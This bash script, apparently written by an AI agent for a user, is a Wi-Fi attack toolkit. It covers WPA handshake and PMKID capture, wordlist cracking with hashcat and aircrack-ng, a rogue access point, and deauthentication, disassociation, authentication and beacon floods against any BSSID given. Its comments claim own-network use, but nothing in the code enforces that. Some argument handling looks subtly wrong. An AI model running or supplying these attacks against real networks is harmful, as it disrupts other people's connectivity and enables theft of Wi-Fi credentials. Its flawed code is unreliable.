#!/usr/bin/env bash
# wifi-lab.sh — legal WiFi practice-range helper
# Author: Hermes (for clumzzy)
#
# SCOPE: YOUR OWN networks / hardware only. No third-party APs.
# This script is split into modules you run explicitly — nothing runs
# unless you call the subcommand. It never auto-deauths randoms.
#
# Hardware note (RTL8822CE / rtw88_8822ce):
#   - monitor mode: OK (passive capture works)
#   - injection: unreliable with stock driver.
#   => Use the PMKID / passive path for capture (no deauth needed).
#   => For deauth-driven handshake capture you NEED a USB adapter with
#      a real injection driver (Alfa AWUS036ACH/AWUS1900 -> rtl88xxau,
#      or TP-Link TL-WN722N v1 -> ath9k_htc).
#
set -u

PHY="phy0"
MGMT="wlp1s0"
MON="mon0"
CHANNEL="${CHANNEL:-1}"
OUTDIR="${OUTDIR:-$HOME/wifi-captures}"

usage() {
  cat <<'EOF'
wifi-lab.sh <cmd>

CAPTURE (passive, works on RTL8822CE):
  mon-up        Add a monitor interface (keeps your managed iface online)
  mon-down      Remove the monitor interface
  survey        Passive scan: list APs + clients seen on a channel
  cap-hs        Capture WPA handshake to file (needs a client to auth)
  cap-pmkid     Passive PMKID capture (NO deauth — works on capture-only card)
  crack-cpu     Crack a .cap/.hc22000 with aircrack-ng (CPU wordlist)
  rogue-ap      Bring up YOUR OWN test AP via hostapd + dnsmasq (legal target)
  clean         Kill capture procs, restore interfaces

INJECTION TESTS (needs injection-capable USB adapter):
  inject-test   Definitive injection test (aireplay-ng -9) — brief air impact

DEATH ATTACKS (lab only, YOUR OWN AP):
  deauth        Deauth flood: kick ALL clients off target AP
  disassoc      Disassoc flood: kick ONE client off target AP
  auth-flood    Auth flood: fill target AP's client association table
  beacon-flood  Beacon flood (needs mdk4 + ssid list file)
  clean-all     Kill all attack/monitor procs, restore interfaces
EOF
}

mon_up() {
  sudo iw dev "$MGMT" interface add "$MON" type monitor 2>/dev/null || \
    sudo ip link set "$MON" down && sudo iw dev "$MON" set type monitor
  sudo ip link set "$MON" up
  sudo iw dev "$MON" set channel "$CHANNEL"
  echo "[+] $MON up on channel $CHANNEL (managed $MGMT still online)"
}

mon_down() {
  sudo iw dev "$MON" del 2>/dev/null && echo "[-] $MON removed"
}

survey() {
  mkdir -p "$OUTDIR"
  echo "[*] Surveying channel $CHANNEL for 20s (Ctrl-C to stop early)..."
  sudo airodump-ng --band abg -c "$CHANNEL" "$MON" \
    --write "$OUTDIR/survey" --output-format csv
  echo "[*] APs/clients written to $OUTDIR/survey-*.csv"
}

cap_hs() {
  # Needs: target BSSID + a client currently (or about to) authenticate.
  # Without a USB injector, use cap-pmkid instead, or deauth from a 2nd radio.
  [ $# -lt 2 ] && { echo "usage: cap-hs <BSSID> <essid>"; exit 1; }
  mkdir -p "$OUTDIR"
  echo "[*] Capturing handshake for $2 ($1) on ch $CHANNEL..."
  sudo airodump-ng -c "$CHANNEL" --bssid "$1" -w "$OUTDIR/$2" "$MON"
}

cap_pmkid() {
  # Passive, no deauth. Best fit for the RTL8822CE capture-only card.
  command -v hcxdumptool >/dev/null || { echo "[-] need hcxdumptool (see notes)"; exit 1; }
  mkdir -p "$OUTDIR"
  echo "[*] Passive PMKID capture on $MON (Ctrl-C to stop)..."
  sudo hcxdumptool -i "$MON" -o "$OUTDIR/pmkid.pcapng" --enable_status=1
  echo "[*] Convert: hcxpcapngtool -o $OUTDIR/pmkid.22000 $OUTDIR/pmkid.pcapng"
}

crack_cpu() {
  [ $# -lt 2 ] && { echo "usage: crack-cpu <capture.cap|.22000> <wordlist>"; exit 1; }
  if [[ "$1" == *.22000 ]]; then
    hashcat -m 22000 "$1" "$2" --weak-hash-threshold 0
  else
    sudo aircrack-ng -w "$2" "$1"
  fi
}

inject_test() {
  [ $# -lt 1 ] && { echo "usage: inject-test <BSSID-of-YOUR-AP>"; exit 1; }
  echo "[*] Injection test against $1 (brief deauth burst)..."
  sudo aireplay-ng -9 -e "$1" "$MON"
}

rogue_ap() {
  # Brings up YOUR OWN AP to serve as a legal handshake-capture target.
  # Requires hostapd + dnsmasq. Edit the two conf files referenced below.
  command -v hostapd >/dev/null && command -v dnsmasq >/dev/null || \
    { echo "[-] install hostapd + dnsmasq first"; exit 1; }
  sudo hostapd /etc/wifi-lab/hostapd.conf -B
  sudo dnsmasq -C /etc/wifi-lab/dnsmasq.conf
  echo "[+] Rogue lab AP 'wifi-lab' up on $MGMT in AP mode"
}

clean() {
  sudo pkill -f airodump-ng 2>/dev/null
  sudo pkill -f hcxdumptool 2>/dev/null
  sudo pkill -f aireplay-ng 2>/dev/null
  sudo pkill -f mdk4 2>/dev/null
  sudo pkill -f hostapd 2>/dev/null
  sudo pkill -f dnsmasq 2>/dev/null
  mon_down
  # Also remove the wifi-lab test AP interface if it exists
  (ip link show wifi-lab >/dev/null 2>&1) && sudo iw dev wifi-lab del
  # Also remove fake-ap beacon interface if it exists
  (ip link show fake-ap >/dev/null 2>&1) && sudo iw dev fake-ap del
  echo "[-] All procs killed, interfaces restored"
}

# ---- DEATH ATTACKS ----

deauth() {
  # Flood deauth to ALL clients on target AP (broadcast)
  [ $# -lt 1 ] && { echo "usage: deauth <TARGET-BSSID> [count]"; exit 1; }
  local target="${1}"
  local count="${2:-0}"  # 0 = infinite
  echo "[!] DEAUTH FLOOD: target ${target}, count=${count} (0=infinite)"
  echo "    Ctrl+C to stop."
  sudo aireplay-ng --deauth "${count}" -a "${target}" "$MON"
}

disassoc() {
  # Flood disassoc to ONE specific client (surgical)
  [ $# -lt 2 ] && { echo "usage: disassoc <TARGET-BSSID> <CLIENT-MAC>"; exit 1; }
  local target="${1}"
  local client="${2}"
  echo "[!] DISASSOC FLOOD: target ${target}, client ${client}"
  echo "    Ctrl+C to stop."
  sudo aireplay-ng --deauth 0 -a "${target}" -c "${client}" "$MON"
}

auth_flood() {
  # Fill AP's association table with fake auth/assoc entries
  [ $# -lt 1 ] && { echo "usage: auth-flood <TARGET-BSSID> [count]"; exit 1; }
  local target="${1}"
  local count="${2:-0}"
  local fake_mac="de:ad:be:ef:00:01"
  echo "[!] AUTH FLOOD: target ${target}, fake MAC ${fake_mac}, count=${count}"
  echo "    Ctrl+C to stop."
  sudo aireplay-ng --fakeauth "${count}" -a "${target}" -e "${fake_mac}" "$MON"
}

beacon_flood() {
  # Flood beacon frames with fake SSIDs (needs mdk4 + injection)
  [ $# -lt 1 ] && { echo "usage: beacon-flood <ssid-list-file>"; exit 1; }
  local ssid_file="${1}"
  [ ! -f "${ssid_file}" ] && { echo "[-] file not found: ${ssid_file}"; exit 1; }
  echo "[!] BEACON FLOOD from $(wc -l < "${ssid_file}") SSIDs on channel $CHANNEL"
  echo "    Ctrl+C to stop."
  sudo mdk4 "${MON}" b -n "${ssid_file}"
}

# ---- case dispatch (add new subcommands) ----
cmd="${1:-help}"
shift || true
case "$cmd" in
  mon-up) mon_up ;;
  mon-down) mon_down ;;
  survey) survey ;;
  cap-hs) cap_hs "$@" ;;
  cap-pmkid) cap_pmkid ;;
  crack-cpu) crack_cpu "$@" ;;
  inject-test) inject_test "$@" ;;
  rogue-ap) rogue_ap ;;
  deauth) deauth "$@" ;;
  disassoc) disassoc "$@" ;;
  auth-flood) auth_flood "$@" ;;
  beacon-flood) beacon_flood "$@" ;;
  clean) clean ;;
  clean-all) clean ;;
  *) usage ;;
esac
